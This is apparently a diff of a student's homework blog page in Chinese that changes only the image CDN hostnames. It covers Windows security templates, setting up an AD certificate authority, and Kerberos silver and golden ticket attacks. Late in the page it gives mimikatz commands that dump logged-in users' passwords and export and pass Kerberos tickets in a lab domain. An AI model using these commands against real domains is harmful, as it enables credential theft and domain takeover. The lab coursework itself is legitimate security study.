-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image60.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image60.png" alt=""></p>
 <p>文件-添加/删除管理单元-安全模板-添加、安全配置和分析-添加</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image61.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image61.png" alt=""></p>
 <p>（右击）安全模板-新加模板搜索路径-【选择%SystemRoot%\security\templates】</p>
 <p>注：%SystemRoot%默认为C:\Windows</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image62.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image62.png" alt=""></p>
 <p>（右击）安全配置和分析-【输入oss（新建一个数据库）】-打开-【选择%SystemRoot%\security\templates中的DC<br>security.inf】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image63.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image63.png" alt=""></p>
 <p>（右击）安全配置和分析-立即分析计算机</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image64.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image64.png" alt=""></p>
 <p>因为安全配置和分析默认使用的文件夹是”文档”，而我们的文档在上一步已经重定向到了Client-No1，所以这里将oss.log放在桌面。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image65.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image65.png" alt=""></p>
 <p>接下来系统会根据安全模板分析系统安全机制。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image66.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image66.png" alt=""></p>
 <p>分析完成后，我们就可以点击各项节点来查看与模板不一致的条目。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image67.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image67.png" alt=""></p>
 <p>因为是新建的数据库，所以数据库没有具体设置模板中的数值。</p>
 <p>我们可以对这些属性的数值进行具体的设置。</p>
 <p>比如：（双击/右击+属性）密码必须符合复杂性要求-在数据库中定义这个策略-已启用</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image68.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image68.png" alt=""></p>
 <p>接着，我们发现这一条目出现了绿色对勾，这代表”当前配置与基准线符合或较之更好”；而红色错叉代表”当前配置与基准线不符合”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image69.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image69.png" alt=""></p>
 <p>（双击/右击+属性）放宽最小密码长度限制-说明</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image70.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image70.png" alt=""></p>
 <p>（双击/右击+属性）最小密码长度审核-说明</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image71.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image71.png" alt=""></p>
 <p>我们可以按安全模板中所指示的安全性变化进行配置。</p>
 <p>（右击）安全配置和分析-立即配置计算机</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image72.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image72.png" alt=""></p>
 <p>【选择桌面上的oss.log】-确定</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image73.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image73.png" alt=""></p>
 <p>即可按安全模板配置计算机安全。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image74.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image74.png" alt=""></p>
 <p>最后我们可以将此控制台保存下来，便于此后使用。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image75.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image75.png" alt=""></p>
 <h2 id="Public-Key-Infrastructure"><a href="#Public-Key-Infrastructure" class="headerlink" title="Public Key Infrastructure"></a>Public Key Infrastructure</h2><h3 id="使用Windows中的PKI"><a href="#使用Windows中的PKI" class="headerlink" title="使用Windows中的PKI"></a>使用Windows中的PKI</h3><h4 id="创建证书颁发机构"><a href="#创建证书颁发机构" class="headerlink" title="创建证书颁发机构"></a>创建证书颁发机构</h4><p>服务器管理器-添加角色和功能</p>
 <p>连续下一步，直到下图页面，【点击Active Diretory证书服务】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image76.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image76.png" alt=""></p>
 <p>添加功能</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image77.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image77.png" alt=""></p>
 <p>连续下一步，直到下图界面，【勾选证书颁发机构Web注册】，即开启网页注册功能。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image78.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image78.png" alt=""></p>
 <p>添加功能。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image79.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image79.png" alt=""></p>
 <p>连续下一步，确认到如下内容后点击安装。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image80.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image80.png" alt=""></p>
 <p>接下来配置AD证书服务。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image81.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image81.png" alt=""></p>
 <p>下一步，【勾选证书颁发机构*】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image82.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image82.png" alt=""></p>
 <p>连续下一步，最后点击配置</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image83.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image83.png" alt=""></p>
 <p>配置成功后进入下一步。</p>
 <h4 id="用户申请证书"><a href="#用户申请证书" class="headerlink" title="用户申请证书"></a>用户申请证书</h4><p>使用xuwp-No1登录Client-No1，访问<a target="_blank" rel="noopener" href="https://xuwp05191643.com/certsrv">https://xuwp05191643.com/certsrv</a></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image84.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image85.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image84.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image85.png" alt=""></p>
 <p>高级证书申请</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image86.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image86.png" alt=""></p>
 <p>创建并向此CA提交一个申请</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image87.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image87.png" alt=""></p>
 <p>注：必须使用IE内核访问。</p>
 <p>在IIS（inetmgr）中把DefaultWebSite的网站绑定更改为仅https。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image88.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image88.png" alt=""></p>
 <p>若无法加载CSP，可将网站加入受信任的站点，或将Internet改为受信任站点的配置（安全级别中，取消启用保护模式的勾选）。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image89.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image89.png" alt=""></p>
 <p>申请一个EFS恢复代理的证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image90.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image90.png" alt=""></p>
 <p>注：该选项需要增加Domin Users并允许注册</p>
 <p>安装此证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image91.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image91.png" alt=""></p>
 <p>成功安装证书</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image92.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image92.png" alt=""></p>
 <p>【打开控制台（mmc）】-添加或删除管理单元-证书-添加</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image93.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image93.png" alt=""></p>
 <p>证书-当前用户-个人-证书</p>
 <p>查看到xuwp-No1成功从Server-No1上申请了一个证书，友好名称（好记的名称）为xuwp-cert。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image94.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image94.png" alt=""></p>
 <p>回到Server-No1，在颁发的证书处也能发现该证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image95.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image95.png" alt=""></p>
 <p>成功。</p>
 <h4 id="证书的导出和导入"><a href="#证书的导出和导入" class="headerlink" title="证书的导出和导入"></a>证书的导出和导入</h4><h5 id="证书导出"><a href="#证书导出" class="headerlink" title="证书导出"></a>证书导出</h5><p>（右击）证书项-所有任务-导出</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image96.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image96.png" alt=""></p>
 <p>这里我选了base64编码。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image97.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image97.png" alt=""></p>
 <p>导出证书到桌面</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image98.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image98.png" alt=""></p>
 <p>最后确认如下，点击完成</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image99.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image99.png" alt=""></p>
 <p>在桌面上发现了我们导出的证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image100.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image100.png" alt=""></p>
 <p>使用记事本打开，确实是base64编码</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image101.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image101.png" alt=""></p>
 <p>注：如果用其他格式导出，记事本无法解析内容。</p>
 <p>打开证书，确认是我们从Server-No1申请的证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image102.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image102.png" alt=""></p>
 <h5 id="证书导入"><a href="#证书导入" class="headerlink" title="证书导入"></a>证书导入</h5><p>首先我们把已有的证书删掉。</p>
 <p>（右击）证书项-删除</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image103.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image103.png" alt=""></p>
 <p>证书-当前用户-个人-（右击）证书-所有任务-导入</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image104.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image104.png" alt=""></p>
 <p>最后确认如下，点击完成。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image105.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image105.png" alt=""></p>
 <p>成功恢复证书，但发现友好名称没了。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image106.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image106.png" alt=""></p>
 <h4 id="通过组策略自动注册"><a href="#通过组策略自动注册" class="headerlink" title="通过组策略自动注册"></a>通过组策略自动注册</h4><p>证书颁发机构（本地）-<br>xuwp05191643-SERVER-NO1-CA-证书模板-（右击）空白处-管理</p>
 <p>（右击）代码签名-复制模板</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image107.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image107.png" alt=""></p>
 <p>【勾选 在Active Directory中发布证书】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image108.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image108.png" alt=""></p>
 <p>安全-【增加Domin Users】-勾选其注册、自动注册</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image109.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image109.png" alt=""></p>
 <p>（右击）空白处-新建-要颁发的证书模板-代码签名 的副本</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image110.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image110.png" alt=""></p>
 <p>计算机配置-策略-Windows设置-安全设置-公钥策略-自动证书申请设置</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image111.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image111.png" alt=""></p>
 <p>（右击）自动证书申请设置-新建-自动证书申请</p>
 <p>选择计算机</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image112.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image112.png" alt=""></p>
 <p>完成</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image113.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image113.png" alt=""></p>
 <p>用户配置-策略-Windows设置-安全设置-公钥策略</p>
 <p>（双击/右击+属性）证书服务客户端-自动注册</p>
 <p>配置模式-启用-【勾选 续订…和更新使用…】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image114.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image114.png" alt=""></p>
 <p>回到Client-No1，发现新增了两张证书，包括”代码签名 的副本”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image115.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image115.png" alt=""></p>
 <p>成功。</p>
 <h4 id="证书的吊销"><a href="#证书的吊销" class="headerlink" title="证书的吊销"></a>证书的吊销</h4><p>证书颁发机构（本地）- xuwp05191643-SERVER-NO1-CA-颁发的证书</p>
 <p>（右击）欲吊销的证书项-所有任务-吊销证书</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image116.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image116.png" alt=""></p>
 <h3 id="证书的使用"><a href="#证书的使用" class="headerlink" title="证书的使用"></a>证书的使用</h3><h4 id="用SSL加密IIS的传输"><a href="#用SSL加密IIS的传输" class="headerlink" title="用SSL加密IIS的传输"></a>用SSL加密IIS的传输</h4><p>IIS管理器-（右击）服务器证书-打开功能</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image117.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image117.png" alt=""></p>
 <p>创建证书申请</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image118.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image118.png" alt=""></p>
 <p>填写证书信息</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image119.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image119.png" alt=""></p>
 <p>默认，下一步</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image120.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image120.png" alt=""></p>
 <p>设置一个证书路径，点击完成。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image121.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image121.png" alt=""></p>
 <p>查看制作的证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image122.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image122.png" alt=""></p>
 <p>以xuwp-No1的身份访问<a target="_blank" rel="noopener" href="https://xuwp05191643.com/certsrv">https://xuwp05191643.com/certsrv</a></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image123.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image123.png" alt=""></p>
 <p>选择使用base64编码的…</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image124.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image124.png" alt=""></p>
 <p>粘贴制作证书中的base64，选择Web服务器。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image125.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image125.png" alt=""></p>
 <p>注：该选项需要增加Domin Users并允许注册</p>
 <p>下载证书</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image126.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image126.png" alt=""></p>
 <p>IIS管理器-完成证书申请</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image127.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image127.png" alt=""></p>
 <p>导入下载的证书文件。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image128.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image128.png" alt=""></p>
 <p>发现新增了一张证书</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image129.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image129.png" alt=""></p>
 <p>（右键）该证书项-详细路径-使用者</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image130.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image130.png" alt=""></p>
 <p>在Client-No1上访问<strong>https</strong>://xuwp05191643.com/certsrv，查看其证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image131.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image131.png" alt=""></p>
 <p>成功。</p>
 <h1 id="作业三"><a href="#作业三" class="headerlink" title="作业三"></a>作业三</h1><p>注：本文对图片的说明位于图片上方，因部分图片过大可能造成错页现象。</p>
 <h2 id="Kerberos认证协议及其攻击"><a href="#Kerberos认证协议及其攻击" class="headerlink" title="Kerberos认证协议及其攻击"></a>Kerberos认证协议及其攻击</h2><p>Kerberos原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，字面意思为”黑暗中的恶魔”。</p>
 <p>网络安全中的Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。域环境下的身份认证使用的就是Kerberos协议。</p>
-<h3 id="Kerberos认证协议流程"><a href="#Kerberos认证协议流程" class="headerlink" title="Kerberos认证协议流程"></a>Kerberos认证协议流程</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206052201553.png" alt=""></p>
+<h3 id="Kerberos认证协议流程"><a href="#Kerberos认证协议流程" class="headerlink" title="Kerberos认证协议流程"></a>Kerberos认证协议流程</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206052201553.png" alt=""></p>
 <p>协议中的用到的名词缩写：</p>
 <p>AS (Authentication Service): 认证服务器</p>
 <p>TGS (Ticket Granting Service): 票据授予服务器</p>
@@ -1616,9 +1616,9 @@ C \rightarrow S:\left. \ \text{Ticket}_{S} \right\|\text{Authenticator}_{C}</scr
 \text{Authenticator}_{C} = E_{K_{C,S}}\lbrack\text{ID}_{C}||\left. \ \text{AD}_{C} \right\|\text{TS}_{5}\rbrack</script><p>6)</p>
 <script type="math/tex; mode=display">
 S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白银票据攻击原理"><a href="#白银票据攻击原理" class="headerlink" title="白银票据攻击原理"></a>白银票据攻击原理</h3><p>白银票据（Silver Ticket）通过伪造ST（Service Ticket）完成攻击，因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以白银票据只能访问指定服务。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950807.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950807.png" alt=""></p>
 <h3 id="黄金票据攻击原理"><a href="#黄金票据攻击原理" class="headerlink" title="黄金票据攻击原理"></a>黄金票据攻击原理</h3><p>白银票据（Golden Ticket）通过伪造TGT（TicketGranting Ticket）完成攻击。域用户有了TGT，那么就可以发送给TGS换取任意服务的ST。有了金票就有了域内的最高权限。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950669.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051950669.png" alt=""></p>
 <h2 id="票据传递攻击（PtT）"><a href="#票据传递攻击（PtT）" class="headerlink" title="票据传递攻击（PtT）"></a>票据传递攻击（PtT）</h2><p>票据传递攻击就是将Kerberos协议认证过程中的某些票据传递到普通域用户手中，然后他们便可以得到票据相应的权限，我们可以传递已存在票据（从域管理员用户处导出），也可以根据服务器信息生成出有用的票据进行传递，如白银票据、黄金票据。</p>
 <p>本次实验要求演示后两种，事实上传递已存在票据十分简单，不需获取信息，只要两行通用命令即可。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br><span class="line">kerberos::ptt [<span class="number">0</span>;<span class="number">34</span><span class="type">c63</span>]<span class="literal">-2</span><span class="literal">-0</span><span class="literal">-60a10000</span><span class="literal">-ailx00</span>@krbtgt<span class="literal">-HACKBIJI</span>.TOP.kirbi</span><br></pre></td></tr></table></figure>
@@ -1634,13 +1634,13 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 </li>
 </ol>
 <h3 id="取得域管理员用户"><a href="#取得域管理员用户" class="headerlink" title="取得域管理员用户"></a>取得域管理员用户</h3><p>在域中主机登录本地用户Administrator</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951682.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951682.png" alt=""></p>
 <p>获取主机及其所在域信息</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951586.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951586.png" alt=""></p>
 <p>获取域控制器名称：SERVER-NO5</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:XUWP05191643</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951918.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951918.png" alt=""></p>
 <p>使用mimikatz获取已登录用户密码</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <p>或者直接利用&gt;将打印结果输出到文件</p>
